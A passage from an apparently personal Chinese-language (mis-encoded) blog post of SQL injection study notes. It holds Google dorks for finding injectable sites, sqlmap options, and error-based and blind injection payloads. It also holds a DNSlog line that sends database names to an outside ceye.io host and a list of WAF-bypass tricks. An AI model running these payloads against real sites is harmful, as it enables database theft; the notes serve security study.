30ã€ifnull() å‡å¦‚å‚æ•°1ä¸ä¸ºNULLï¼Œåˆ™è¿”å›å€¼ä¸ºå‚æ•°1ï¼Œå¦åˆ™å…¶è¿”å›å€¼ä¸ºå‚æ•°2

31exp()è¿”å›eçš„xæ¬¡æ–¹



äºŒã€ç›®æ ‡æœé›†

1ã€æ— ç‰¹å®šç›®æ ‡ï¼šinurl:.php?id=

2ã€æœ‰ç‰¹å®šç›®æ ‡ï¼šinurl:php?id= site:

3ã€å·¥å…·çˆ¬å–ï¼šspider,å¯¹æœç´¢å¼•æ“å’Œç›®æ ‡ç½‘ç«™çš„é“¾æ¥è¿›è¡Œçˆ¬å–



ä¸‰ã€æ³¨å…¥è¯†åˆ«

1ã€æ‰‹å·¥ç®€å•è¯†åˆ«:

'

and 1=1/and 1=2

and '1'='1/and '1'='2

and 1like 1/and 1like 2

2ã€å·¥å…·è¯†åˆ«ï¼š

sqlmap -m filename(filenameä¸­ä¿å­˜æ£€æµ‹ç›®æ ‡)

sqlmap --crawl(sqlmapå¯¹ç›®æ ‡ç½‘ç«™è¿›è¡Œçˆ¬å–ï¼Œç„¶åä¸€æ¬¡è¿›è¡Œæµ‹è¯•)

3ã€é«˜çº§è¯†åˆ«

æ‰©å±•è¯†åˆ«å¹¿åº¦å’Œæ·±åº¦:

SqlMap --level å¢åŠ æµ‹è¯•çº§åˆ«ï¼Œå¯¹headerä¸­ç›¸å…³å‚æ•°ä¹Ÿè¿›è¡Œæµ‹è¯•

sqlmap -r filename(filenameä¸­ä¸ºç½‘ç«™è¯·æ±‚æ•°æ®)

åˆ©ç”¨å·¥å…·è¯†åˆ«æé«˜æ•ˆç‡

BurpSuite+Sqlmap

BurpSuiteæ‹¦æˆªæ‰€æœ‰æµè§ˆå™¨è®¿é—®æäº¤çš„æ•°æ®

BurpSuiteæ‰©å±•æ’ä»¶ï¼Œç›´æ¥è°ƒç”¨SqlMapè¿›è¡Œæµ‹è¯•ä¸€äº›Tips

å¯ä»¥åœ¨å‚æ•°åé”®å…¥&quot;*&quot;æ¥ç¡®å®šæƒ³è¦æµ‹è¯•çš„å‚æ•°

å¯èƒ½å‡ºç°çš„ç‚¹ï¼šæ–°é—»ã€ç™»å½•ã€æœç´¢ã€ç•™è¨€

ç«™åœ¨å¼€å‘çš„è§’åº¦å»å¯»æ‰¾



å››ã€æŠ¥é”™æ³¨å…¥æ–¹æ³•

1ã€floor() :select count(*) from information_schema.tables group by concat((select

2ã€version()),floor(rand(0)*2));https://github.com/ADOOO/Dnslogsqlinj

3ã€group byä¼šå¯¹rand()å‡½æ•°è¿›è¡Œæ“ä½œæ—¶äº§ç”Ÿé”™è¯¯

4ã€concat:è¿æ¥å­—ç¬¦ä¸²åŠŸèƒ½

5ã€floor:å–floatçš„æ•´æ•°å€¼

6ã€rand:å–0~1ä¹‹é—´éšæœºæµ®ç‚¹å€¼

7ã€group by:æ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„å¹¶æœ‰æ’åºåŠŸèƒ½

8ã€extractvalue():extractvalue(1,concat(0x7e,(select user()),0x7e));

9ã€updatexml():select updatexml(1,concat(0x7e,(select user()),0x7e),1);



äº”ã€å¸ƒå°”ç›²æ³¨

1ã€left()å‡½æ•°

left(database(),1)&gt;'s'

database()æ˜¾ç¤ºæ•°æ®åº“åç§°,leÈ¨(a,b)ä»å·¦ä¾§æˆªå–açš„å‰bä½

2ã€regexp

select user() regexp'^r'

æ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•user()ç»“æœä¸ºroot,regexpä¸ºåŒ¹é…rootçš„æ­£åˆ™è¡¨è¾¾å¼

3ã€like

select user() like'^ro%'

ä¸regexpç±»ä¼¼ï¼Œä½¿ç”¨likeè¿›è¡ŒåŒ¹é…

4ã€substr()å‡½æ•° ascii()å‡½æ•°

substr()å‡½æ•° ascii(substr((select database()),1,1))&lt;&gt;98

substr(a,b,c)ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦ï¼Œascii()å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸ºasciiå€¼

5ã€ord()å‡½æ•° mid()å‡½æ•°

ord(mid((select user()),1,1))=114

mid(a,b,c)ä»ä½ç½®bå¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cä½ord()å‡½æ•°åŒascii(),å°†å­—ç¬¦è½¬ä¸ºasciiå€¼



å…­ã€æ—¶é—´ç›²æ³¨

if(left(user(),1)='a',0,sleep(3));



ä¸ƒã€DNSlogæ³¨å…¥

SELECT LOAD_FILE(CONCAT('\\\\',select database(),'.mysql.r4ourp.ceye.io\\abc'));



å…«ã€å®½å­—èŠ‚æ³¨å…¥

1ã€åœ¨æ³¨å…¥ç‚¹åé”®å…¥%df,ç„¶åæŒ‰ç…§æ­£å¸¸çš„è¯¸å¦‚æµç¨‹å¼€å§‹æ³¨å…¥

2ã€é»‘ç›’æµ‹è¯•ï¼š

åœ¨å¯èƒ½çš„æ³¨å…¥ç‚¹åé”®å…¥%df,ä¹‹åè¿›è¡Œæ³¨å…¥æµ‹è¯•

3ã€ç™½ç›’æµ‹è¯•ï¼š

æŸ¥çœ‹MySqlç¼–ç æ˜¯å¦ä¸ºGBK

æ˜¯å¦ä½¿ç”¨preg_replaceæŠŠå•å¼•å·æ›¿æ¢æˆ\'

æ˜¯å¦ä½¿ç”¨addslashesè¿›è¡Œè½¬ä¹‰

æ˜¯å¦ä½¿ç”¨mysql_real_escape_stringè¿›è¡Œè½¬ä¹‰

4ã€é˜²æ­¢å®½å­—èŠ‚æ³¨å…¥

ä½¿ç”¨utf-8,é¿å…å®½å­—èŠ‚æ³¨å…¥

ps:ä¸ä»…åœ¨gbk,éŸ©æ–‡ã€æ—¥æ–‡ç­‰ç­‰éƒ½æ˜¯å®½å­—èŠ‚ï¼Œéƒ½å¾ˆæœ‰å¯èƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥æ¼æ´

mysql_real_escape_string,mysql_set_charset('gbk',$conn);

è®¾ç½®å‚æ•°ï¼Œcharacter_set_client=binary



ä¹ã€äºŒæ¬¡ç¼–ç 

1ã€åœ¨æ³¨å…¥ç‚¹åé”®å…¥%2527,ç„¶åæŒ‰ç…§æ­£å¸¸çš„æ³¨å…¥æµç¨‹å¼€å§‹æ³¨å…¥

2ã€é»‘ç›’æµ‹è¯•ï¼š

åœ¨å¯èƒ½çš„æ³¨å…¥ç‚¹åé”®å…¥%2527,ä¹‹åè¿›è¡Œæ³¨å…¥æµ‹è¯•

3ã€ç™½ç›’æµ‹è¯•

æ˜¯å¦ä½¿ç”¨urldecodeå‡½æ•°

urldecodeå‡½æ•°æ˜¯å¦å­˜åœ¨è½¬ä¹‰æ–¹æ³•ä¹‹å



åã€äºŒæ¬¡æ³¨å…¥

1ã€æ’å…¥æ¶æ„æ•°æ®

ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œå†å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®æœ¬èº«åŒ…å«æ¶æ„å†…å®¹ã€‚

2ã€å¼•ç”¨æ¶æ„æ•°æ®

åœ¨å°†æ•°æ®å­˜å…¥åˆ°æ•°æ®åº“ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡éœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºäº†è€Œå·²æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆSQLçš„äºŒæ¬¡æ³¨å…¥ã€‚

3ã€äºŒæ¬¡æ³¨å…¥é˜²å¾¡ï¼š

å¯¹å¤–éƒ¨æäº¤çš„æ•°æ®ï¼Œéœ€è¦æ›´åŠ è°¨æ…çš„å¯¹å¾…ã€‚

ç¨‹åºå†…éƒ¨çš„æ•°æ®è°ƒç”¨ï¼Œä¹Ÿè¦ä¸¥æ ¼çš„è¿›è¡Œæ£€æŸ¥ï¼Œä¸€æ—¦ä¸å°å¿ƒï¼Œæµ‹è¯•è€…å°±èƒ½å°†ç‰¹å®šäº†SQLè¯­å¥å¸¦å…¥åˆ°æŸ¥è¯¢å½“ä¸­ã€‚



åä¸€ã€WAFç»•è¿‡

ç†Ÿç»ƒæŒæ¡MySQLå‡½æ•°å’Œè¯­æ³•ä½¿ç”¨æ–¹æ³•+æ·±å…¥äº†è§£ä¸­é—´ä»¶è¿è¡Œå¤„ç†æœºåˆ¶+äº†è§£WAFé˜²æŠ¤åŸç†åŠæ–¹æ³•=éšå¿ƒæ‰€æ¬²çš„ç»•è¿‡WAFçš„ä¿æŠ¤

1ã€ç™½ç›’ç»•è¿‡

ä½¿ç”¨äº†blacklistå‡½æ•°è¿‡æ»¤äº†'or'å’Œ'AND'

å¤§å°å†™å˜å½¢:Or,OR,oR

ç­‰ä»·æ›¿æ¢ï¼šand-&gt;&amp;&amp;,or-&gt;||

2ã€é»‘ç›’ç»•è¿‡

å¯»æ‰¾æºç«™-&gt;é’ˆå¯¹äº‘WAF

åˆ©ç”¨åŒç½‘æ®µ-&gt;ç»•è¿‡WAFé˜²æŠ¤åŒºåŸŸ

åˆ©ç”¨è¾¹ç•Œæ¼æ´-&gt;ç»•è¿‡WAFé˜²æŠ¤åŒºåŸŸ

èµ„æºé™åˆ¶è§’åº¦ç»•è¿‡WAF

POSTå¤§BODY

è¯·æ±‚æ–¹å¼å˜æ¢GET-&gt;POST

Content-Typeå˜æ¢ï¼šapplication/x-www-form-urlencoded;-&gt;multipart/form-data;

å‚æ•°æ±¡æŸ“

SQLæ³¨é‡Šç¬¦ç»•è¿‡

Level-1:union/**/select

Level-2:union/*aaaa%01bbs*/select

Level-3:union/*aaaaaaaaaaaaaaaaaaaaaaa*/select

å†…è”æ³¨é‡Š:/*!xxx*/

ç©ºç™½ç¬¦ç»•è¿‡

MySQLç©ºç™½ç¬¦ï¼š%09,%0A,%0B,%0D,%20,%0C,%A0,/*XXX*/

æ­£åˆ™çš„ç©ºç™½ç¬¦:%09,%0A,%0B,%0D,%20

Example-1:union%250Cselect

Example-2:union%25A0select

concat%2520(

concat/**/(

concat%250c(http://127.0.0.1/Less/?id=1

concat%25a0(

æµ®ç‚¹æ•°è¯æ³•è§£æ

select * from users where id=8E0union select 1,2,3

select * from users where id=8.0union select 1,2,3

select * from users where id=\Nunion select 1,2,3

extractvalue(1.concat(0x5c,md5(3)));

updatexml(1,concat(0x5d,md5(3))),1);

GeometryCollection((select*from(select@@version)f)x))

polygon((select*from(select name_const(version(),1))x))

linestring()

multipoint()

multilinestring()

multipolygon()

MySQLç‰¹æ®Šè¯­æ³•

select{x table_name}from{x information_schema.tables};

3ã€Fuzzç»•è¿‡

æ³¨é‡Šç¬¦ç»•è¿‡

æœ€åŸºæœ¬çš„:union/**/select

ä¸­é—´å¼•å…¥ç‰¹æ®Šå­—:union/*aaa%0abbs*/select

æœ€åæµ‹è¯•æ³¨é‡Šé•¿åº¦:union/*aaaaaaaaaaaaaaa*/select

æœ€åŸºæœ¬çš„æ¨¡å¼:union/*something*/select

a1%!%2f



åäºŒã€sqlmapçš„conf

sqlmap.py -v3(ä¸»å‡½æ•°å…¥å£)

--user-agent=websecurity(è¯·æ±‚æ‰©å……)

--threads=5(è®¿é—®ä¼˜åŒ–)

-p idæ³¨å…¥é…ç½®

--level 3ï¼ˆæ£€æµ‹é…ç½®ï¼‰

--technique=E(æ³¨å…¥æŠ€æœ¯)

--current-user(ä¿¡æ¯è·å–)

--flush-sessionï¼ˆé€šç”¨è®¾ç½®ï¼‰
</code></pre>
<p>å‚è€ƒï¼š</p>
<p>https://jwt1399.top/posts/32179.html#toc-heading-17</p>
<p>https://www.cnblogs.com/xishaonian/p/6036909.html</p>
<p>https://segmentfault.com/a/1190000020402185?utm_source=sf-similar-article</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E4%B8%80sql%E6%B3%A8%E5%85%A5">ä¸€ï¼š<strong>sqlæ³¨å…¥</strong></a><br>
*<br>
*<br>
*<br>
* <a href="#%E4%BB%80%E4%B9%88%E6%98%AFsql%E6%B3%A8%E5%85%A5">ä»€ä¹ˆæ˜¯sqlæ³¨å…¥ï¼Ÿï¼Ÿï¼Ÿ</a>
<ul>
<li><a href="#i%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80">â… ï¼šæ•°æ®åº“åŸºç¡€</a><br>
*
<ul>
<li><a href="#sql%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A">sqlä¸­çš„æ³¨é‡Š</a></li>
<li><a href="#sql%E4%B8%AD%E9%93%BE%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%87%BD%E6%95%B0">sqlä¸­é“¾æ¥å­—ç¬¦ä¸²çš„å‡½æ•°</a></li>
<li><a href="#1%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B">â‘ æ³¨å…¥ç®€ä»‹</a>
<ul>
<li><a href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86">sqlæ³¨å…¥åŸç†</a></li>
<li><a href="#%E6%A0%B9%E6%8D%AEsql%E6%95%B0%E6%8D%AE%E5%88%86%E7%B1%BB">æ ¹æ®sqlæ•°æ®åˆ†ç±»</a>
<ul>
<li><a href="#1-%E6%95%B4%E5%BD%A2%E6%B3%A8%E5%85%A5">1ã€æ•´å½¢æ³¨å…¥</a></li>
<li><a href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">2ã€å­—ç¬¦å‹æ³¨å…¥</a></li>
</ul>
</li>
<li><a href="#%E6%A0%B9%E6%8D%AEsql%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95%E5%88%86%E7%B1%BB">æ ¹æ®sqlæ³¨å…¥è¯­æ³•åˆ†ç±»</a>
<ul>
<li><a href="#1-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5boolean-based-blind-sql-injection">1ã€å¸ƒå°”æ³¨å…¥ï¼ˆBoolean-based blind SQL injectionï¼‰</a></li>
<li><a href="#2-%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5time-based-blind-sql-injection">2ã€æ—¶é—´æ³¨å…¥ï¼ˆTime-based blind SQL injectionï¼‰</a></li>
<li><a href="#3-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5union-query-sql-injection">3ã€è”åˆæ³¨å…¥ï¼ˆUnion query SQL injectionï¼‰</a></li>
<li><a href="#4-%E5%A4%9A%E8%AF%AD%E5%8F%A5%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5stacted-queries-sql-injection">4ã€å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼ˆStacted queries SQL injectionï¼‰</a></li>
<li><a href="#5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5error-based-sql-injection">5ã€æŠ¥é”™æ³¨å…¥ï¼ˆError-based SQL injectionï¼‰</a></li>
</ul>
</li>
<li><a href="#%E5%85%B6%E4%BB%96%E7%A7%8D%E7%B1%BB%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">å…¶ä»–ç§ç±»æ³¨å…¥æ–¹å¼</a>
<ul>
<li><a href="#%E7%9B%B2%E6%B3%A8">ç›²æ³¨</a>
<ul>
<li><a href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8">åŸºäºæ—¶é—´çš„ç›²æ³¨</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%8F%91%E7%8E%B0%E6%B3%A8%E5%85%A5%E7%82%B9">å‘ç°æ³¨å…¥ç‚¹</a>
<ul>
<li><a href="#1-%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">1ã€ä½¿ç”¨æ¼æ´æ‰«æå·¥å…·</a></li>
<li><a href="#2-%E4%BD%BF%E7%94%A8%E8%B0%B7%E6%AD%8Chacking%E5%AF%BB%E6%89%BE">2ã€ä½¿ç”¨è°·æ­Œhackingå¯»æ‰¾</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#ii%E5%B0%9D%E8%AF%95sql%E6%B3%A8%E5%85%A5">â…¡ï¼šå°è¯•sqlæ³¨å…¥</a>
<ul>
<li><a href="#1-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF">1ã€æ‰‹å·¥æ³¨å…¥æ€è·¯</a></li>
<li><a href="#2-%E5%A4%8D%E7%8E%B0">2ã€å¤ç°</a>
<ul>
<li><a href="#1-%E9%A6%96%E5%85%88-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E5%AD%98%E5%9C%A8%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B">1ã€é¦–å…ˆ åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œå­˜åœ¨çš„æ³¨å…¥ç‚¹æ˜¯å­—ç¬¦å‹å’Œæ•°å­—å‹</a></li>
<li><a href="#2%E7%8C%9C%E8%A7%A3-sql-%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0">2.çŒœè§£ SQL æŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°</a></li>
<li><a href="#3-%E7%A1%AE%E5%AE%9A%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E7%9A%84%E9%A1%BA%E5%BA%8F">3ã€ç¡®å®šæ˜¾ç¤ºå­—æ®µçš„é¡ºåº</a></li>
<li><a href="#4-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93">4ã€è·å–å½“å‰æ•°æ®åº“</a></li>
<li><a href="#5-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8">5ã€è·å–æ•°æ®åº“ä¸­çš„è¡¨</a></li>
<li><a href="#6-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D">6ã€è·å–å½“å‰è¡¨ä¸­å­—æ®µå</a></li>
<li><a href="#7-%E4%B8%8B%E8%BD%BD%E6%95%B0%E6%8D%AE%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF">7ã€ä¸‹è½½æ•°æ®ï¼ˆè·å–å­—æ®µä¿¡æ¯ï¼‰</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#iii%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5%E5%BE%85%E6%B5%8B%E8%AF%95">â…¢ï¼šä½¿ç”¨sqlmapæ³¨å…¥ï¼ˆå¾…æµ‹è¯•ï¼‰</a>
<ul>
<li><a href="#1-sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">1ã€sqlmapä½¿ç”¨æ•™ç¨‹</a></li>
<li><a href="#%E5%85%B6%E4%BB%96sql%E6%B3%A8%E5%85%A5">å…¶ä»–sqlæ³¨å…¥</a>
<ul>
<li><a href="#1-sql%E7%9B%B2%E6%B3%A8">1ã€sqlç›²æ³¨</a><br>
*
<ul>
<li><a href="#%E6%89%8B%E5%B7%A5%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><strong>æ‰‹å·¥ç›²æ³¨å¸¸ç”¨å‚æ•°</strong></a></li>
<li><a href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">å¸ƒå°”ç›²æ³¨</a>
<ul>
<li><a href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0">æ‰‹å·¥æ³¨å…¥å®ç°ï¼š</a></li>
<li><a href="#sqlmap%E5%AE%9E%E7%8E%B0%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5">sqlmapå®ç°å¸ƒå°”æ³¨å…¥</a></li>
</ul>
</li>
<li><a href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">æ—¶é—´ç›²æ³¨</a>
<ul>
<li><a href="#%E6%89%8B%E5%B7%A5%E5%AE%9E%E7%8E%B0">æ‰‹å·¥å®ç°ï¼š</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#2-dnslog%E6%B3%A8%E5%85%A5%E6%9C%89%E5%BE%85%E5%AD%A6%E4%B9%A0">2ã€DNSlogæ³¨å…¥ï¼ˆæœ‰å¾…å­¦ä¹ ï¼‰</a>
<ul>
<li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">åŸºç¡€çŸ¥è¯†</a></li>
<li><a href="#%E5%8E%9F%E7%90%86">åŸç†</a></li>
</ul>
</li>
<li><a href="#3-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">3ã€å®½å­—èŠ‚æ³¨å…¥</a>
<ul>
<li><a href="#%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95">æ‰‹å·¥æµ‹è¯•ï¼š</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8sqlmap">ä½¿ç”¨sqlmapï¼š</a></li>
</ul>
</li>
<li><a href="#4-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E9%9C%80%E8%A6%81%E8%A1%A5%E5%85%85">4ã€æŠ¥é”™æ³¨å…¥ï¼ˆéœ€è¦è¡¥å……ï¼‰</a>
<ul>
<li><a href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">flooræŠ¥é”™æ³¨å…¥/åŒæŸ¥è¯¢æ³¨å…¥</a></li>
<li><a href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">updatexmlæŠ¥é”™æ³¨å…¥</a></li>
<li><a href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">extractvalueæŠ¥é”™æ³¨å…¥</a></li>
</ul>
</li>
<li><a href="#5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">5ã€äºŒæ¬¡æ³¨å…¥</a>
<ul>
<li><a href="#%E6%9C%89%E5%BE%85%E5%AD%A6%E4%B9%A0-">æœ‰å¾…å­¦ä¹ --=</a></li>
</ul>
</li>
<li><a href="#6-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">6ã€å †å æ³¨å…¥</a></li>
<li><a href="#7-http-head%E6%B3%A8%E5%85%A5">7ã€http headæ³¨å…¥</a>
<ul>
<li><a href="#cookie%E6%B3%A8%E5%85%A5">cookieæ³¨å…¥</a></li>
<li><a href="#xff%E6%B3%A8%E5%85%A5">XFFæ³¨å…¥</a></li>
<li><a href="#ua%E6%B3%A8%E5%85%A5">UAæ³¨å…¥</a></li>
</ul>
</li>
<li><a href="#8-%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6">8ã€è¯»å†™æ–‡ä»¶</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95">é¶åœºè®°å½•</a></li>
<li><a href="#iv%E5%8A%A0%E5%9B%BAsql">â…£ï¼šåŠ å›ºsql</a></li>
<li><a href="#%E9%99%84%E4%BB%B6">é™„ä»¶</a>
<ul>
<li><a href="#sql%E6%B3%A8%E5%85%A5">sqlæ³¨å…¥</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%BA%8Cxss%E6%B3%A8%E5%85%A5">äºŒï¼šxssæ³¨å…¥</a><br>
*<br>
*<br>
* <a href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86">æ”»å‡»åŸç†</a>
<ul>
<li><a href="#%E4%B8%BB%E8%A6%81%E5%88%86%E4%B8%BA%E4%B8%89%E5%A4%A7%E7%B1%BB">ä¸»è¦åˆ†ä¸ºä¸‰å¤§ç±»</a>
<ul>
<li><a href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss">1ã€åå°„å‹xss</a></li>
<li><a href="#2-%E5%AD%98%E5%82%A8%E5%9E%8Bxss">2ã€å­˜å‚¨å‹xss</a></li>
<li><a href="#3-dome%E5%9E%8Bxss">3ã€domeå‹xss</a></li>
</ul>
</li>
<li><a href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95">æ‰‹åŠ¨æµ‹è¯•</a><br>
*
<ul>
<li><a href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8B">1ã€åå°„å‹</a></li>
<li><a href="#2-%E5%AD%98%E5%82%A8%E5%9E%8B">2ã€å­˜å‚¨å‹</a></li>
<li><a href="#3-dom%E5%BD%A2xss">3ã€domå½¢XSS</a></li>
<li><a href="#4-xss%E7%9B%B2%E6%89%93">4ã€XSSç›²æ‰“</a></li>
<li><a href="#5-xss%E8%BF%87%E6%BB%A4">5ã€XSSè¿‡æ»¤</a></li>
<li><a href="#6-xss%E4%B9%8Bhtmlspecialchars">6ã€<strong>xssä¹‹htmlspecialchars</strong></a></li>
<li><a href="#xss%E5%8A%A0%E5%9B%BA">xssåŠ å›º</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E9%99%84%E4%B8%8A">é™„ä¸Š</a>
<ul>
<li><a href="#%E4%B8%80-mysql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0">ä¸€ã€MySqlæ³¨å…¥å¸¸ç”¨å‡½æ•°</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        

        

        <div class="site-footer">
  ç›å¡å·´å¡
  <a class="rss" href="https://xiaoguai69.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
